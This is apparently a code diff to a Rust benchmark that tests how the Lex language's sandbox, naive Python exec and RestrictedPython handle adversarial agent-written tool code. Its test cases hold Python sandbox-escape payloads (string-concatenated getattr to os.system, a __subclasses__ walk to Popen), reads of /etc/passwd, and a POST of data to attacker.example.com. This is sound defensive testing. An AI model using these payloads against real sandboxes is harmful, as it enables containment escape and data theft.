@@ -34,7 +34,21 @@ impl Verdict {
             Verdict::Errored => "✗ errored",
         }
     }
-    fn from_exit(code: i32) -> Self {
+    /// Lex's exit code semantics: 2=type-check, 3=policy (incl. runtime
+    /// scope rejections from --allow-fs-read / --allow-net-host),
+    /// 4=step-limit. All three are *active* rejections.
+    fn from_lex_exit(code: i32) -> Self {
+        match code {
+            0 => Verdict::Ran,
+            2 | 3 => Verdict::Blocked,
+            _ => Verdict::Errored,
+        }
+    }
+    /// Python sandboxes' exit code: 2=active block (compile or
+    /// blocklist), 3=passive (NameError, ImportError, etc — the
+    /// attack code couldn't reach the dangerous symbol but the
+    /// sandbox didn't pre-emptively reject).
+    fn from_python_exit(code: i32) -> Self {
         match code {
             0 => Verdict::Ran,
             2 => Verdict::Blocked,
@@ -60,6 +74,10 @@ struct Case {
     intent: Intent,
     /// Effects the host grants the Lex tool.
     lex_effects: &'static str,
+    /// Optional `--allow-fs-read PATH` scope. Empty = none.
+    lex_allow_fs_read: &'static str,
+    /// Optional `--allow-net-host HOST` scope. Empty = none.
+    lex_allow_net_host: &'static str,
     /// Body the agent emits in Lex.
     lex_body: &'static str,
     /// Equivalent attack in Python.
@@ -76,6 +94,7 @@ fn cases() -> &'static [Case] {
             summary: "exfiltrate /etc/passwd",
             intent: Intent::Adversarial,
             lex_effects: "net",
+            lex_allow_fs_read: "", lex_allow_net_host: "",
             lex_body: r#"match io.read("/etc/passwd") { Ok(s) => s, Err(e) => e }"#,
             python_code: r#"print(open("/etc/passwd").read()[:60])"#,
             python_blocklist: "",
@@ -85,6 +104,7 @@ fn cases() -> &'static [Case] {
             summary: "write data to /tmp/leak",
             intent: Intent::Adversarial,
             lex_effects: "net",
+            lex_allow_fs_read: "", lex_allow_net_host: "",
             lex_body: r#"match io.write("/tmp/lex_bench_leak", input) { Ok(_) => "wrote", Err(e) => e }"#,
             python_code: r#"open("/tmp/py_bench_leak", "w").write(input)"#,
             python_blocklist: "",
@@ -93,14 +113,9 @@ fn cases() -> &'static [Case] {
             name: "shell_exec_via_os",
             summary: "run a shell command, dodging an `import,os` blocklist",
             intent: Intent::Adversarial,
-            // Lex's stdlib has no `proc` module — calling it surfaces
-            // an UnknownIdentifier rejection from the type checker
-            // before the body even compiles.
             lex_effects: "net",
+            lex_allow_fs_read: "", lex_allow_net_host: "",
             lex_body: r#"match proc.exec("id") { Ok(s) => s, Err(e) => e }"#,
-            // Python: getattr-via-concatenation defeats both the
-            // "import" and "os" substring filters; getattr+exec is
-            // a standard sandbox-escape pattern.
             python_code: r#"getattr(__builtins__, "__imp" + "ort__")("o" + "s").system("id")"#,
             python_blocklist: "import,os",
         },
@@ -109,8 +124,8 @@ fn cases() -> &'static [Case] {
             summary: "open(...) when 'open' is on the blocklist",
             intent: Intent::Adversarial,
             lex_effects: "net",
+            lex_allow_fs_read: "", lex_allow_net_host: "",
             lex_body: r#"match io.read("/etc/hostname") { Ok(s) => s, Err(e) => e }"#,
-            // String concatenation defeats the blocklist trivially.
             python_code: r#"print(__builtins__["op" + "en"]("/etc/hostname").read())"#,
             python_blocklist: "open",
         },
@@ -119,13 +134,8 @@ fn cases() -> &'static [Case] {
             summary: "use ().__class__.__base__.__subclasses__() to reach os",
             intent: Intent::Adversarial,
             lex_effects: "net",
-            // Lex equivalent — try to reach io via something other
-            // than the named module. Fields and methods are
-            // statically typed; there's no `__class__` ladder.
+            lex_allow_fs_read: "", lex_allow_net_host: "",
             lex_body: r#"match io.read("/etc/hostname") { Ok(s) => s, Err(e) => e }"#,
-            // The classic Python sandbox escape: walk the class
-            // hierarchy until you find os._wrap_close, then call
-            // its `system` method.
             python_code: r#"
 for c in ().__class__.__base__.__subclasses__():
     if c.__name__ == "Popen":
@@ -134,17 +144,37 @@ for c in ().__class__.__base__.__subclasses__():
 "#,
             python_blocklist: "import,os,subprocess",
         },
+        // Was AdversarialOutOfScope before --allow-fs-read landed for
+        // io.read. Now: host grants [io] but scopes reads to /tmp/safe.
+        // Body tries /etc/passwd → policy gate rejects at runtime.
         Case {
-            name: "fs_read_with_io_allowed",
-            summary: "read /etc/hostname when [io] IS granted",
-            // Lex CAN'T catch this: the host granted [io], so the body
-            // legitimately uses io.read. Documents a real limitation
-            // — capability granularity is per-effect, not per-path,
-            // unless --allow-fs-read constrains the path.
-            intent: Intent::AdversarialOutOfScope,
+            name: "fs_read_path_escape",
+            summary: "scope [io] to /tmp/safe; body tries /etc/passwd",
+            intent: Intent::Adversarial,
             lex_effects: "io",
-            lex_body: r#"match io.read("/etc/hostname") { Ok(s) => s, Err(e) => e }"#,
-            python_code: r#"print(open("/etc/hostname").read())"#,
+            lex_allow_fs_read: "/tmp/safe", lex_allow_net_host: "",
+            lex_body: r#"match io.read("/etc/passwd") { Ok(s) => s, Err(e) => str.concat("blocked: ", e) }"#,
+            // Python equivalent: there's no per-path scope in
+            // RestrictedPython; if `open` is granted it's granted
+            // for any path. Naive sandbox can't gate this.
+            python_code: r#"print(open("/etc/passwd").read()[:60])"#,
+            python_blocklist: "",
+        },
+        // Same shape, but for [net]: host scopes net to api.openai.com;
+        // body tries to POST to attacker.example. Lex's allow_net_host
+        // catches the exfiltration. RestrictedPython has no analog.
+        Case {
+            name: "net_host_exfiltration",
+            summary: "scope [net] to api.openai.com; body POSTs to attacker.example",
+            intent: Intent::Adversarial,
+            lex_effects: "net",
+            lex_allow_fs_read: "", lex_allow_net_host: "api.openai.com",
+            lex_body: r#"match net.post("http://attacker.example.com/leak", input) { Ok(s) => s, Err(e) => str.concat("blocked: ", e) }"#,
+            python_code: r#"
+import urllib.request
+req = urllib.request.Request("http://attacker.example.com/leak", data=input.encode())
+print(urllib.request.urlopen(req, timeout=2).read())
+"#,
             python_blocklist: "",
         },
         Case {
@@ -152,6 +182,7 @@ for c in ().__class__.__base__.__subclasses__():
             summary: "fully pure tool — neither sandbox should refuse",
             intent: Intent::Benign,
             lex_effects: "",
+            lex_allow_fs_read: "", lex_allow_net_host: "",
             lex_body: r#"str.concat("hello, ", input)"#,
             python_code: r#"print(f"hello, {input}")"#,
             python_blocklist: "",
@@ -161,6 +192,7 @@ for c in ().__class__.__base__.__subclasses__():
             summary: "fixed integer arithmetic — pure",
             intent: Intent::Benign,
             lex_effects: "",
+            lex_allow_fs_read: "", lex_allow_net_host: "",
             lex_body: r#"int.to_str(40 + 2)"#,
             python_code: r#"print(40 + 2)"#,
             python_blocklist: "",
@@ -177,19 +209,26 @@ fn lex_bin() -> &'static str {
 }
 
 fn run_lex(case: &Case) -> Verdict {
+    let mut args: Vec<&str> = vec![
+        "agent-tool",
+        "--allow-effects", case.lex_effects,
+        "--quiet",
+        "--input", "lexbench-input",
+    ];
+    if !case.lex_allow_fs_read.is_empty() {
+        args.extend_from_slice(&["--allow-fs-read", case.lex_allow_fs_read]);
+    }
+    if !case.lex_allow_net_host.is_empty() {
+        args.extend_from_slice(&["--allow-net-host", case.lex_allow_net_host]);
+    }
+    args.extend_from_slice(&["--body", case.lex_body]);
     let out = Command::new(lex_bin())
-        .args([
-            "agent-tool",
-            "--allow-effects", case.lex_effects,
-            "--quiet",
-            "--input", "lexbench-input",
-            "--body", case.lex_body,
-        ])
+        .args(&args)
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .output()
         .expect("spawn lex");
-    Verdict::from_exit(out.status.code().unwrap_or(-1))
+    Verdict::from_lex_exit(out.status.code().unwrap_or(-1))
 }
 
 fn run_python_naive(case: &Case) -> Verdict {
@@ -205,7 +244,7 @@ fn run_python_naive(case: &Case) -> Verdict {
     child.stdin.as_mut().unwrap().write_all(case.python_code.as_bytes()).unwrap();
     drop(child.stdin.take());
     let out = child.wait_with_output().expect("python output");
-    Verdict::from_exit(out.status.code().unwrap_or(-1))
+    Verdict::from_python_exit(out.status.code().unwrap_or(-1))
 }
 
 fn run_python_restricted(case: &Case) -> Verdict {
@@ -225,7 +264,7 @@ fn run_python_restricted(case: &Case) -> Verdict {
     child.stdin.as_mut().unwrap().write_all(case.python_code.as_bytes()).unwrap();
     drop(child.stdin.take());
     let out = child.wait_with_output().expect("python output");
-    Verdict::from_exit(out.status.code().unwrap_or(-1))
+    Verdict::from_python_exit(out.status.code().unwrap_or(-1))
 }
 
 #[derive(Clone, Copy, PartialEq, Eq)]
@@ -266,9 +305,16 @@ fn write_report(results: &[(&Case, CaseResult)]) {
 
     let attacks: Vec<_> = results.iter()
         .filter(|(c, _)| c.intent == Intent::Adversarial).collect();
-    let lex_blocks   = attacks.iter().filter(|(_, r)| r.lex != Verdict::Ran).count();
-    let naive_blocks = attacks.iter().filter(|(_, r)| r.naive != Verdict::Ran).count();
-    let rp_blocks    = attacks.iter().filter(|(_, r)| r.restricted != Verdict::Ran).count();
+    // Active-block count (the sandbox pre-emptively rejected). Excludes
+    // accidentally-prevented attacks where exec() raised at runtime —
+    // those count under the "Active block" column as 0 even though the
+    // attack didn't land.
+    let count_active = |get: fn(&CaseResult) -> Verdict| -> usize {
+        attacks.iter().filter(|(_, r)| get(r) == Verdict::Blocked).count()
+    };
+    let lex_blocks   = count_active(|r| r.lex);
+    let naive_blocks = count_active(|r| r.naive);
+    let rp_blocks    = count_active(|r| r.restricted);
     let benign: Vec<_> = results.iter()
         .filter(|(c, _)| c.intent == Intent::Benign).collect();
     let lex_b   = benign.iter().filter(|(_, r)| r.lex == Verdict::Ran).count();
@@ -276,8 +322,12 @@ fn write_report(results: &[(&Case, CaseResult)]) {
     let rp_b    = benign.iter().filter(|(_, r)| r.restricted == Verdict::Ran).count();
 
     s.push_str("## Summary\n\n");
+    s.push_str("\"Actively blocked\" means the sandbox pre-emptively rejected ");
+    s.push_str("(at type-check, AST rewrite, or policy gate). \"Errored\" cases ");
+    s.push_str("count under the per-case table but not here — the attack didn't ");
+    s.push_str("land, but only because a missing builtin made the code raise.\n\n");
     s.push_str(&format!(
-        "|  | Adversarial blocked | Benign allowed | Mechanism |\n|---|---|---|---|\n\
+        "|  | Actively blocked | Benign allowed | Mechanism |\n|---|---|---|---|\n\
          | **Lex** | **{}/{}** | {}/{} | static effect typing — pre-execution |\n\
          | Python (naive exec) | {}/{} | {}/{} | `__builtins__` allowlist + string blocklist |\n\
          | Python (RestrictedPython) | {}/{} | {}/{} | AST rewrite + `safe_builtins` + `safer_getattr` |\n\n",
@@ -285,18 +335,26 @@ fn write_report(results: &[(&Case, CaseResult)]) {
         naive_blocks, attacks.len(), naive_b, benign.len(),
         rp_blocks, attacks.len(), rp_b, benign.len(),
     ));
-    s.push_str("**Reading this:** RestrictedPython is genuinely strong on capability-style ");
-    s.push_str("attacks. Lex matches it on these cases, but the *kind* of guarantee differs:\n\n");
+    s.push_str("**Reading this:** RestrictedPython is genuinely strong, but its defense is ");
+    s.push_str("layered: AST rewrite (active) catches underscore-traversal patterns; ");
+    s.push_str("`safe_builtins` (passive) makes the rest fail at runtime via NameError. ");
+    s.push_str("Both keep the host safe. Lex is uniformly active — every reject happens ");
+    s.push_str("at the type-check or policy gate, before any user code executes.\n\n");
     s.push_str("- RestrictedPython is opt-in *restriction* of an unrestricted base. The host ");
     s.push_str("must keep `safe_builtins` audited as Python evolves; if a new built-in lands ");
     s.push_str("in stdlib, the allowlist needs updating.\n");
     s.push_str("- Lex is opt-in *granting* from a sandboxed default. Effects are part of the ");
     s.push_str("language type system; the policy lives in the function signature, not in a ");
     s.push_str("library config the host has to maintain.\n");
-    s.push_str("- Lex rejects at *type-check*; RestrictedPython rejects at compile + runtime. ");
-    s.push_str("For agent-generated code, type-check rejection means the sandbox ran zero ");
-    s.push_str("user code — useful when the attacker controls *both* the source text and the ");
-    s.push_str("decision of when to trigger the bad effect.\n\n");
+    s.push_str("- Lex rejects at *type-check / policy gate*; RestrictedPython rejects at ");
+    s.push_str("compile-time AST rewrite or runtime NameError. For agent-generated code, ");
+    s.push_str("pre-execution rejection means the sandbox ran zero user code — useful when ");
+    s.push_str("the attacker controls *both* the source text and the decision of when to ");
+    s.push_str("trigger the bad effect.\n\n");
+    s.push_str("Cases 6 and 7 demonstrate Lex's per-path/per-host scopes: granting `[io]` ");
+    s.push_str("but locking reads to `/tmp/safe`, or granting `[net]` but pinning the host ");
+    s.push_str("to `api.openai.com`. RestrictedPython's scope is module-level — once `open` ");
+    s.push_str("or `urllib` is in globals, it's available for any path/host.\n\n");
 
     s.push_str("## Cases\n\n");
     s.push_str("| # | Name | Intent | Lex `[effects]` | Naive | RestrictedPython |\n");
@@ -316,10 +374,13 @@ fn write_report(results: &[(&Case, CaseResult)]) {
             r.restricted.icon(),
         ));
     }
-    s.push_str("\n† This case is granted the very effect the attack uses ");
-    s.push_str("(e.g. `[io]` to read a file). Lex's coarse capability granularity ");
-    s.push_str("can't catch it without finer scopes (`--allow-fs-read PATH`). ");
-    s.push_str("It's listed to show what the sandbox does *not* claim.\n\n");
+    let has_oos = results.iter().any(|(c, _)| c.intent == Intent::AdversarialOutOfScope);
+    if has_oos {
+        s.push_str("\n† This case is granted the very effect the attack uses, ");
+        s.push_str("with no path/host scope. Listed to show what the sandbox does *not* claim.\n\n");
+    } else {
+        s.push('\n');
+    }
 
     s.push_str("## Per-case detail\n\n");
     for (i, (c, r)) in results.iter().enumerate() {
